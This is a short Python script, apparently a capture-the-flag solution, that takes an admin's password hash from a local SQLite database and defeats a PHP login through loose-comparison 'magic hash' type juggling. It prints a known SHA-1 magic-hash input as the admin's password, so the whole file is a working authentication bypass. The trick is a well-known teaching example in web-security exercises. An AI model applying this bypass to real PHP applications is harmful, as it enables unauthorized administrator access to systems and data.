#!/usr/bin/env python3
from sqlite3 import *
from hashlib import sha1

conn = connect('database.db')
c = conn.cursor()

# in php 0e525... is equal to 0 so we have to find another hash which start with 0e
# https://github.com/spaze/hashes/tree/master
password_hash = c.execute("SELECT password FROM users WHERE username = 'admin'").fetchall()[0][0]
password = sha1(b"aaroZmOk").hexdigest()
assert password[:2] == password_hash[:2] # 0e

print(f"admin's password: aaroZmOk")